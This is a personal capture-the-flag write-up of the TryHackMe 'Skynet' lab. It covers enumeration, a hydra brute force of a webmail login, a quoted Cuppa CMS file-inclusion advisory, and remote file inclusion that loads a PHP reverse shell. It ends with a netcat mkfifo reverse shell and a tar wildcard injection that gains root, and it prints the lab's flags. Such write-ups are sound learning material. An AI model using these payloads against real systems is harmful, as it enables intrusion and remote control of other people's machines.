<p align="center">November 10, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{188}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{ Skynet }}$$
</h1>
<p align="center">A vulnerable Terminator themed Linux machine.</p>
<p align="center">Access this TryHackMe Room clicking <a href="https://tryhackme.com/r/room/skynet">Skynet</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/af537775-bab8-42f2-80b6-b921a06df4be">
  <img height="150px" src="https://github.com/user-attachments/assets/ab1ed339-f66a-473c-b5ed-54e5a14c5b00">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Deploy and compromise the vulnerable machine!](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Room Complete](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#3) </p>

<br>
<br>
<br>
<br>
<br>
<h2>Task 1. Deploy and compromise the vulnerable machine<a id='1'></a></h2>
<br>

<p align="center">
  <img width="750px" src="https://github.com/user-attachments/assets/f2c86c61-b24c-44be-a9e1-2eab25546076">
</p>


<p>You can follow our official walkthrough for this challenge on our <a href="https://tryhackme.com/r/resources/blog/skynet-writeup">blog</a>.</p>

<br>
<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 1.1. <em>What is Miles password for his emails?</em><br><a id='1.1'></a>
>> <code><strong>cyborg007haloterminator</strong></code>

<br>

<pre><code>root@[Attack_Box]/skynet:~#nano /etc/hosts
...
</code></pre>

<br>

<h3>Used Nmap to scan ports</h3>
<br>
<p>Ports 22/SSH, 80/HTTP, 110/SMB, 139/IMAP, 143/POP3 and 445/NetBIOS are open.</p>
<br>

<pre><code>root@[Attack_Box]/skynet:~# nmap -sC -sV -A skynet.thm

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-10 01:37 GMT
Nmap scan report for skynet.thm ([Target])
Host is up (0.00059s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING CAPA RESP-CODES UIDL AUTH-RESP-CODE SASL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: Pre-login LOGIN-REFERRALS LITERAL+ have IMAP4rev1 IDLE post-login capabilities listed ID more OK LOGINDISABLEDA0001 ENABLE SASL-IR
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
...
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-11-09T19:38:15-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-10 01:38:15
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms skynet.thm (10.10.217.249)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
</code></pre>

<h3>Used Gobuster to enumerate directories</h3>
<br>
<p>By checking the directories, Gobuster indicated <code>/admin</code>, <code>/css</code>, <code>/js</code>, <code>/config</code>, <code>ai</code> and <code>/squirrelmail</code>.</p>
<br>

<pre><code>root@[Attack_Box]/skynet:~# gobuster dir -u http://skynet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://skynet.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://skynet.thm/admin/]
/css                  (Status: 301) [Size: 306] [--> http://skynet.thm/css/]
/js                   (Status: 301) [Size: 305] [--> http://skynet.thm/js/]
/config               (Status: 301) [Size: 309] [--> http://skynet.thm/config/]
/ai                   (Status: 301) [Size: 305] [--> http://skynet.thm/ai/]
/squirrelmail         (Status: 301) [Size: 315] [--> http://skynet.thm/squirrelmail/]
/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>
<h3>Used smbclient</h3>
<br>

<p><code>SMB</code> is a is a network file sharing protocol that is used to share files and peripherals between computers on a network. The SMB server can sometimes allow <code>anonymous access</code>. An anonymous access allows a user to connect to a share without providing any password. </p>

<br>

<p>Let´s used <code>smbclient</code>code> to check if we have <code>anonymous access</code>.</p>

<br>

<pre><code>root@[Attack_Box]/skynet:~# smbclient -L \\skynet.thm
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# smbclient \\\\skynet.thm\\anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5810392 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (53.1 KiloBytes/sec) (average 53.1 KiloBytes/sec)
smb: \> exit
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# enum4linux skynet.thm
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Nov 10 02:10:44 2024

 ========================== 
|    Target Information    |
 ========================== 
Target ........... skynet.thm
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on skynet.thm    |
 ================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ========================================== 
|    Nbtstat Information for skynet.thm    |
 ========================================== 
Looking up status of 10.10.217.249
	SKYNET          <00> -         B <ACTIVE>  Workstation Service
	SKYNET          <03> -         B <ACTIVE>  Messenger Service
	SKYNET          <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 =================================== 
|    Session Check on skynet.thm    |
 =================================== 
[+] Server skynet.thm allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for skynet.thm    |
 ========================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

     ==================================== 
|    OS information on skynet.thm    |
 ==================================== 
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for skynet.thm from smbclient: 
[+] Got OS info for skynet.thm from srvinfo:
	SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =========================== 
|    Users on skynet.thm    |
 =========================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:[milesdyson] rid:[0x3e8]

 ======================================= 
|    Share Enumeration on skynet.thm    |
 ======================================= 
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
    
	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET

[+] Attempting to map shares on skynet.thm
//skynet.thm/print$	Mapping: DENIED, Listing: N/A
//skynet.thm/anonymous	Mapping: OK, Listing: OK
//skynet.thm/milesdyson	Mapping: DENIED, Listing: N/A
//skynet.thm/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ================================================== 
|    Password Policy Information for skynet.thm    |
 ================================================== 
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 ============================ 
|    Groups on skynet.thm    |
 ============================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ===================================================================== 
|    Users on skynet.thm via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1001 Unix User\milesdyson (Local User)

 =========================================== 
|    Getting printer info for skynet.thm    |
 =========================================== 
No printers returned.


enum4linux complete on Sun Nov 10 02:11:00 2024
</code></pre>


<pre><code>root@[Attack_Box]/skynet:~# cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# smbclient \\\\skynet.thm\\anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5810392 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (230.0 KiloBytes/sec) (average 230.0 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 153.3 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 115.0 KiloBytes/sec)
smb: \logs\> exit
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# cat log1.txt
cyborg007haloterminator
terminator22596
...
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
</code></pre>

<br>
<p>Logs 2 and 3 are empty.</p>

<pre><code>root@[Attack_Box]/skynet:~# cat log2.txt
cat log3.txt
</code></pre>

<br>
<h3>Visualized web pages</h3>

![image](https://github.com/user-attachments/assets/244bbf1e-2f8b-4729-b5de-5a84d8d53cd1)

<br>

<p>For <code>/admin</code>, <code>/css</code>, <code>/js</code>, <code>/config</code> and <code>ai</code> I received the message <code>Forbidden</code>.  And for <code>/squirrelmail</code> I got the following ...</p>

![image](https://github.com/user-attachments/assets/4b68f403-70c9-4e6b-b112-5780ea525c4f)

<br>

![image](https://github.com/user-attachments/assets/e444bf8d-a1bb-451e-9899-c0ba7c6b2c55)

<br>


<pre><code>root@[Attack_Box]/skynet:~# hydra -l milesdyson -P log1.txt skynet.thm -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2024-11-10 02:38:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://skynet.thm:80//squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target skynet.thm - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: skynet.thm   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2024-11-10 02:39:05
[1]+  Exit 255                hydra -l milesdyson -P log1.txt skynet.thm -V http-form-post /squirrelmail/src/redirect.php:login_username=milesdyson
</code></pre>

<br>

> 1.2. <em>What is the hidden directory?</em><br><a id='1.2'></a>
>> <code><strong>/45kra24zxs28v3yd</strong></code>

<br>

![image](https://github.com/user-attachments/assets/23cadabd-d333-4a7d-9aff-7e27740cbcfb)

<br>

![image](https://github.com/user-attachments/assets/ad70df82-c068-448a-bbe1-e42e86394aa4)

<br>

![image](https://github.com/user-attachments/assets/94f6a9e4-ac84-455b-bdd2-3901ffba8a6f)

<pre><code>
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# smbclient -U milesdyson //skynet.thm/milesdyson
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 17 10:05:47 2019
  ..                                  D        0  Wed Sep 18 04:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
  notes                               D        0  Tue Sep 17 10:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019

		9204224 blocks of size 1024. 5810228 blocks available
smb: \> cd notes
smb: \notes\> dir
  .                                   D        0  Tue Sep 17 10:18:40 2019
  ..                                  D        0  Tue Sep 17 10:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
  important.txt                       N      117  Tue Sep 17 10:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019	
...
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (57.1 KiloBytes/sec) (average 57.1 KiloBytes/sec)
smb: \notes\>	
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# at important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/0de6bbc7-8bc7-4868-936b-335eabdee28d)

<pre><code>
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/881969f8-9a54-42ef-b9a1-fc0cbc0f2592)

<pre><code>i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
</code></pre>

<br>

> 1.3. <em>What is the vulnerability called when you can include a remote file for malicious purposes?</em><br><a id='1.3'></a>
>> <code><strong>remote file inclusion </strong></code>

<br>

![image](https://github.com/user-attachments/assets/9b095964-b591-4353-b5ca-79908bd062f4)

<br>

<pre><code>root@[Attack_Box]/skynet:~# gobuster dir -u http://skynet.thm/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://skynet.thm/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 333] [--> http://skynet.thm/45kra24zxs28v3yd/administrator/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
</code></pre>

<br>
<p>Cuppa CMS!</p>

![image](https://github.com/user-attachments/assets/a94ec49c-093d-415b-8ddb-919c21a37a30)

<br>


<pre><code>root@[Attack_Box]/skynet:~# searchsploit cuppa
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   | php/webapps/25971.txt
---------------------------------------------------------------------------------- ---------------------------------
</code></pre>

<br>

<br>

<pre><code>root@[Attack_Box]/skynet:~# locate 25971.txt
/opt/exploitdb/exploits/php/webapps/25971.txt
/opt/searchsploit/exploits/php/webapps/25971.txt
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# searchsploit 25971.txt
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   | php/webapps/25971.txt
---------------------------------------------------------------------------------- ---------------------------------
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# cat /opt/searchsploit/exploits/php/webapps/25971.txt
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /          
  / XXXXXX /
 (________(            
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22: 
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------
    

#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream 

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
...
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "Db@dmin";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
################################################################################################################
</code></pre>

<br>


<pre><code>http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
</code></pre>

![image](https://github.com/user-attachments/assets/3be775db-8436-4af3-9e14-4ab897535045)

<br>

> 1.4. <em>What is the user flag?</em><br><a id='1.4'></a>
>> <code><strong>7ce5c2109a40f958099283600a9ae807</strong></code>

<br>


<pre><code>root@[Attack_Box]/skynet:~# locate php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/wordlists/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
root@[Attack_Box]/skynet:~# nano /usr/share/webshells/php/php-reverse-shell.php
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# nc -lvnp  444
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# sudo python3 -m http.server
</code></pre>

<br>
<p><code>http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://[AttackBox]:8000/php-rever-shell.php</code></p>
![image](https://github.com/user-attachments/assets/a1c45ab9-eb61-468f-a4cc-251828e950cd)

<br>


<pre><code>root@[Attack_Box]/skynet:~# nc -lvnp 444
Listening on [0.0.0.0] (family 0, port 444)
Connection from [Target] 34492 received!
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:50:46 up  2:28,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ hostname && whoami
skynet
www-data
$ pwd
/
$ cd /home
$ ls
milesdyson
$ cd milesdyson
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807
$ $ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
$ ls -la /home/milesdyson/backups/backup.sh
-rwxr-xr-x 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh
$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
$ tar cf /home/milesdyson/backups/backup.tgz /var/www/html/*
tar: /home/milesdyson/backups/backup.tgz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
$ tar cf /home/milesdyson/backups/backup.tgz /var/www/html/*
tar: /home/milesdyson/backups/backup.tgz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
$ cd /var/www/html
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [AttackBox] 444 >/tmp/f" > php-rever-shell.php
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [AttackBox] 444 >/tmp/f" > shell.sh
$ echo "" > "--checkpoint-action=exec=sh shell.sh"
$ echo "" > --checkpoint=1
$ 
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
[Target] - - [10/Nov/2024 03:50:14] "GET /php-rever-shell.php HTTP/1.0" 200 -
[Target] - - [10/Nov/2024 03:50:47] "GET /php-rever-shell.php HTTP/1.0" 200 -
</code></pre>

<br>

<pre><code>root@[Attack_Box]/skynet:~# nc -lvnp 444
Listening on [0.0.0.0] (family 0, port 444)
Connection from 10.10.217.249 34506 received!
sh: 0: can't access tty; job control turned off
# cd /root
# ls
root.txt
# cat root.txt
3f0372db24753accc7179a282cd6a949
# 
</code></pre>

<br>

> 1.5. <em>What is the root flag?</em><br><a id='1.5'></a>
>> <code><strong>3f0372db24753accc7179a282cd6a949</strong></code>

<br>

<br>
<h2>Room Complete<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>

![image](https://github.com/user-attachments/assets/6a6940c1-7fe4-4f66-b880-f012b0d27ccc)


<p></p>

<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
